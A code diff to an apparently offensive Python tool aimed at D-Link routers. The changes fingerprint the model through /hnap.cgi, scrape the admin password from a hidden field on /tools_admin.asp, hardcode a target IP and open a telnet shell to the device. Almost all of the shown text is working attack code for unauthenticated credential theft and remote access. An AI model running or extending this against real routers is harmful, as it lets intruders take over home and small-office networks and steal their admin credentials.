@@ -40,11 +40,8 @@ class Attacks:
 
 # List of supported routers, and their attack type
 routers = {
-    "DGL-5500": Attacks.USERLESS,
-    "DIR-855L": Attacks.USERLESS,
     "DIR-835": Attacks.USERLESS,
-    "DHP-1565": Attacks.USER,
-    "DIR-652": Attacks.USER
+    "None": Attacks.USERLESS
 }
 
 
@@ -53,6 +50,8 @@ routers = {
 
 def getRouterIP() -> str:
     """ Gets the IP address of the router """
+
+    return "192.168.3.1"
 
     with open("/proc/net/route") as fh:
         for line in fh:
@@ -66,13 +65,20 @@ def getRouterIP() -> str:
 def getRouterType(ip: str) -> str:
     """ Parse router configuration page to check router type """
 
-    try:
-        response = requests.get("http://" + ip).text
+    try: 
+        response = requests.get("http://" + ip + "/hnap.cgi").text
     except:
         return ""
     
     # Use RE to parse router name from login page
-    title = re.search("<title>(.*)<\/title>", response)
+    title = str(re.search("<ModelName>\"(.*)\"<\/ModelName>", response).group(1))
+    
+    # Check for old-style title
+    # if title == "D-LINK CORPORATION, INC | WIRELESS ROUTER | HOME":
+    #     return "DIR-628"
+
+    # if " " in title:
+    #     return None
     
     return title
 
@@ -80,14 +86,17 @@ def getRouterType(ip: str) -> str:
 def isSupported(router_str: str) -> bool:
     """ Check if a router string is supported by this attack """
 
+
     # Return if router string is in the first element of each tuple of routers
-    return router_str in routers
+    return str(router_str) in routers.keys() 
 
 
 def getPassword(ip: str, attack_type: int) -> str:
     """ Parses the router configuration for admin password """
-
-    return ""
+    data = requests.get("http://" + ip + "/tools_admin.asp/").text
+    
+    password = str(re.search('<input type="hidden" id="user_password_tmp" name="user_password_tmp" value="(.*)">', data).group(1))
+    return password
 
 
 def checkDNS() -> str:
@@ -108,6 +117,7 @@ def executeMenuSelection():
         menu[selection]["function"]()
 
 def spawnShell():
+    # TODO: make this auto-login
     os.system(f"telnet {router.ip}")
     print("Shell closed by user")
 
@@ -179,7 +189,7 @@ def main():
         exit(1)
 
     # Check for password
-    router.password = getPassword(router.ip, routers[router.model])
+    router.password = getPassword(router.ip, routers[str(router.model)])
 
     # Display the menu
     displayMenu()
